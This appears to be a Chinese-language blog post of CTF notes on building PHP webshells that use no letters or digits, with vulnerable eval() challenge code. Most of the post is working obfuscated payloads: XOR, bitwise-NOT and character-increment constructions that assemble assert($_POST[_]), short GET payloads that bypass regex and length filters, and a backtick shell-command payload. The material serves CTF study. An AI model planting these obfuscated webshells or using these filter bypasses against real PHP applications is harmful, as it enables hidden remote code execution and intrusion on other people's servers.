<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="对未来的最大慷慨，就是把一切都献给现在。">
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        特殊的webshell - undefined
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
    <i>  </i>
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar ">
            <img src="/" />
        </div>
        <div class="name">
            <i>Luc1fer</i>
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li >
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>HOME</span>
                </a>
            </li>
            <li >
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>TAGS</span>
                </a>
            </li>
            <li >
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>ARCHIVES</span>
                </a>
            </li>
            <li >
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>ABOUT</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#特殊的webshell"><span class="toc-text">特殊的webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#不包含数字字母"><span class="toc-text">不包含数字字母</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#异或"><span class="toc-text">异或</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#取反"><span class="toc-text">取反</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#字符递增"><span class="toc-text">字符递增</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#限制长度"><span class="toc-text">限制长度</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#扩展"><span class="toc-text">扩展</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#不用数字字母和下划线"><span class="toc-text">不用数字字母和下划线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#不用数字、字母、-、"><span class="toc-text">不用数字、字母、_、$</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#another-test"><span class="toc-text">another test</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input"/>
            <span id="begin-search">search</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i>  </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        特殊的webshell
    </div>

    <div class="post-meta">
        <span class="attr">Post：<span>2019-09-27 11:26:55</span></span>
        
        <span class="attr">Tags：/
        
        <a class="tag" href="/tags/#php" title="php">php</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
</span>
</span>
    </div>
    <div class="post-content ">
        <h1 id="特殊的webshell"><a href="#特殊的webshell" class="headerlink" title="特殊的webshell"></a>特殊的webshell</h1><h2 id="不包含数字字母"><a href="#不包含数字字母" class="headerlink" title="不包含数字字母"></a>不包含数字字母</h2><pre><code>&lt;?php
@highlight_file(__FILE__);
if(!preg_match(&apos;/[a-z0-9]/is&apos;,$_GET[&apos;shell&apos;])) {
 eval($_GET[&apos;shell&apos;]);
}
?&gt;</code></pre><h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>异或是对字符的ascii码进行逐位异或以后得到一个异或结果ascii码的字符。第一种方法就是这样来绕过数字字母的检测。</p>
<pre><code>$a=urldecode(&apos;%01&apos;); //ascii 0x01
$b=urldecode(&apos;`&apos;);   //ascii 96
echo $a^$b;             //a
96:  0110 0000
%01: 0000 0001         //相当于ascii+1</code></pre><p>我们统一选取 <strong>‘`’</strong> 作为我们异或的起点，因为他的 ascii 是96。</p>
<pre><code>$_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;);
$__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); // $__=&apos;_POST&apos;;
$___=$$__;
$_($___[_]); // assert($_POST[_]);</code></pre><p>效果如下：</p>
<h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>通过取反将汉字编码中的编码取出来进行取反</p>
<pre><code>echo ((&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)).&apos; &apos;;//利用弱类型的特性
$__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)+(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);
$_=$__/$__;
echo $_;
echo ~(&apos;和&apos;{2});              //s</code></pre><p>payload:</p>
<pre><code>$__=(&apos;&gt;&apos;&gt;&apos;&lt;&apos;)%2b(&apos;&gt;&apos;&gt;&apos;&lt;&apos;);
$_=$__/$__;

$____=&apos;&apos;;
$___=&quot;瞰&quot;;$____.=~($___{$_});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;的&quot;;$____.=~($___{$_});$___=&quot;半&quot;;$____.=~($___{$_});$___=&quot;始&quot;;$____.=~($___{$__});

$_____=&apos;_&apos;;$___=&quot;俯&quot;;$_____.=~($___{$__});$___=&quot;瞰&quot;;$_____.=~($___{$__});$___=&quot;次&quot;;$_____.=~($___{$_});$___=&quot;站&quot;;$_____.=~($___{$_});

$_=$$_____;
$____($_[$__]);</code></pre><p>效果如下：</p>
<h3 id="字符递增"><a href="#字符递增" class="headerlink" title="字符递增"></a>字符递增</h3><blockquote>
<p>在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在 Perl 中 $a = ‘Z’; $a++; 将把 $a 变成’AA’，而在 C 中，a = ‘Z’; a++; 将把 a 变成 ‘[‘（’Z’ 的 ASCII 值是 90，’[‘ 的 ASCII 值是 91）。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增／递减其他字符变量则无效，原字符串没有变化。 </p>
</blockquote>
<pre><code>echo &quot;&lt;h3&gt;Postincrement&lt;/h3&gt;&quot;;
$a = 5;
echo &quot;Should be 5: &quot; . $a++ . &quot;&lt;br /&gt;\n&quot;; //5
echo &quot;Should be 6: &quot; . $a . &quot;&lt;br /&gt;\n&quot;;   //6
$c = &apos;b&apos;;
echo $c++.&quot;&lt;br /&gt;\n&quot;;                     //b
echo $c.&quot;\n&quot;;                               //c
?&gt;</code></pre><p>我们只要拿到一个变量值为 <code>a</code> ，通过自增操作就可以获得 <code>a-z</code> 中所有字符。</p>
<p>php中如果强制链接数组和字符串的话，数组会被转换成字符串，值为 <code>Arrary</code> </p>
<pre><code>echo &apos;&apos;.[];   //Array</code></pre><p>我们取第一个字符就可以得到 <code>A</code> 了。</p>
<p>payload:</p>
<pre><code>&lt;?php
$_=[];
$_=@&quot;$_&quot;; // $_=&apos;Array&apos;;
$_=$_[&apos;!&apos;==&apos;@&apos;]; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E 
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____=&apos;_&apos;;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);</code></pre><h2 id="限制长度"><a href="#限制长度" class="headerlink" title="限制长度"></a>限制长度</h2><p>PHP可以将字符串当作函数来处理：</p>
<pre><code>function B()
{
    echo &quot;hello world!&quot;;
}

$_++;           //1
echo $_;
$__ = &apos;?&apos;^&apos;}&apos;; //B
echo $__;
$__();</code></pre><p>题目：</p>
<pre><code>&lt;?php
include &apos;flag.php&apos;;
if(isset($_GET[&apos;code&apos;])){
    $code = $_GET[&apos;code&apos;];
    if(strlen($code)&gt;40){
        die(&quot;Long.&quot;);
    }
    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){
        die(&quot;NO.&quot;);
    }
    @eval($code);
}else{
    highlight_file(__FILE__);
}
//$hint =  &quot;php function getFlag() to get flag&quot;;
?&gt;</code></pre><p>限制长度为40，之前的异或不行了。我们要利用PHP允许动态执行函数的特点，构造一个 <code>_GET</code> 来去读取 <code>getFlag()</code> </p>
<p>可以通过连续调用异或来获得 <code>_GET</code> </p>
<pre><code>&lt;?php
    echo &quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;//_GET
?&gt;</code></pre><p>通过构造 <code>${$_}[_](${$_}[__]) //$_GET[_]($_GET[__])</code> 来获取参数</p>
<p>最后传入参数 getFlag</p>
<pre><code>?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_](${$_}[__]);&amp;_=getFlag </code></pre><p>后面的 <code>__</code> 我们不传值默认为 <code>NULL</code> 也就相当于 <code>getFlag()</code></p>
<p>事实上下面这也可以：</p>
<pre><code>?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_]();&amp;_=getFlag</code></pre><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><pre><code>?code=$_=~%98%9A%8B%B9%93%9E%98;$_();</code></pre><p>对 <code>getFlag</code> 进行取反然后 <code>URL</code> 编码</p>
<pre><code>?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlag</code></pre><p>这个在{}中进行取反 <code>${~&quot;\xa0\xb8\xba\xab&quot;}</code> ，相当于 <code>$_GET</code>，拼接出了 <code>$_GET[&#39;+&#39;]&amp;#40; &amp;#41;;</code>，传入 <code>+=getFlag()</code> 从而执行了函数`</p>
<h2 id="不用数字字母和下划线"><a href="#不用数字字母和下划线" class="headerlink" title="不用数字字母和下划线"></a>不用数字字母和下划线</h2><p>题目：</p>
<pre><code>&lt;?php

include &apos;flag.php&apos;;

if(isset($_GET[&apos;code&apos;])){
    $code = $_GET[&apos;code&apos;];
    if(strlen($code)&gt;50){
        die(&quot;Too Long.&quot;);
    }
    if(preg_match(&quot;/[A-Za-z0-9_]+/&quot;,$code)){
        die(&quot;Not Allowed.&quot;);
    }
    @eval($code);
}else{
    highlight_file(__FILE__);
}
//$hint =  &quot;php function getFlag() to get flag&quot;;
?&gt;  </code></pre><p>通过上面的取反就可以了</p>
<pre><code>?code=$&amp;#123;%7e%22%A0%B8%BA%AB%22&amp;#125;[%27%2d%27]();&amp;%2d=getFlag //$_GET(&apos;-&apos;)();&amp;-=getFlag;

$c = &quot;_GET&quot;;
echo urlencode(~($c)); //%A0%B8%BA%AB</code></pre><p>这里利用 <code>${}</code> 中的代码可以执行的特点，在 <code>{}</code> 里进行取反操作，其实也就是可变变量</p>
<pre><code>&lt;?php
    $a = &apos;hello&apos;;
    $$a = &apos;world&apos;;
    echo &quot;$a ${$a}&quot;;
?&gt;

输出：hello world</code></pre><p>这里的 <code>$&amp;#123;%7e%22%A0%B8%BA%AB%22&amp;#125;</code> 相当于 <code>$_GET</code> .</p>
<p>还有更骚的，用中文：</p>
<pre><code>code=$啊=(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊();  //%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27=getFlag</code></pre><p>相当于直接给变量赋值了，这样就不用 <code>{}</code> 了</p>
<h2 id="不用数字、字母、-、"><a href="#不用数字、字母、-、" class="headerlink" title="不用数字、字母、_、$"></a>不用数字、字母、_、$</h2><pre><code>&lt;?php 
include &apos;flag.php&apos;;
if(isset($_GET[&apos;code&apos;]))
{
    $code=$_GET[&apos;code&apos;];
    if(strlen($code)&gt;35){
    die(&quot;Long.&quot;);
    }
    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))
    {
        die(&quot;NO.&quot;);
    }
    @eval($code);
}
else
{
    highlight_file(__FILE__);
}
//$hint=&quot;php function getFlag() to get flag&quot;;
?&gt;</code></pre><p>payload:<br>    ?code=?&gt;<?=`/???/??? ????.???`?></p>
<p><code>?&gt;</code> 闭合php文件开头的 <code>&lt;?php</code> , <code>&lt;?</code> 相当于 <code>&lt;? echo</code> .</p>
<p>在配置文件中开启 <code>short_open_tag</code> 后可以使用短标签。默认是开启的。</p>
<h2 id="another-test"><a href="#another-test" class="headerlink" title="another test"></a>another test</h2><pre><code>&lt;?php
highlight_file(__FILE__);

$_ = @$_GET[&apos;_&apos;];
if ( preg_match(&apos;/[\x00- 0-9\&apos;&quot;`$&amp;.,|[{_defgops\x7F]+/i&apos;, $_) )
    die(&apos;rosé will not do it&apos;);

if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )
    die(&apos;you are so close, omg&apos;);

eval($_);
?&gt;</code></pre><p>主要是记录一下大佬的检测可用函数的脚本：</p>
<pre><code>&lt;?php 
$arr = get_defined_functions()[&apos;internal&apos;];

foreach ($arr as $key =&gt; $value) {
    if ( preg_match(&apos;/[\x00- 0-9\&apos;&quot;`$&amp;.,|[{_defgops\x7F]+/i&apos;, $value) ){
        unset($arr[$key]);
        continue;
    }

    if ( strlen(count_chars(strtolower($value), 0x3)) &gt; 0xd ){
        unset($arr[$key]);
        continue;
    }
}

var_dump($arr);
?&gt;</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html" target="_blank" rel="noopener">https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
<p><a href="https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/" target="_blank" rel="noopener">https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/</a></p>
<p><a href="https://xz.aliyun.com/t/5677#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/5677#toc-3</a></p>
</blockquote>

        
        <br />
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <span id="busuanzi_container_site_pv">
            <span id="busuanzi_value_site_pv"></span>PV
        </span>
        <span id="busuanzi_container_site_uv">
            <span id="busuanzi_value_site_uv"></span>UV
        </span>
        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = ""
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
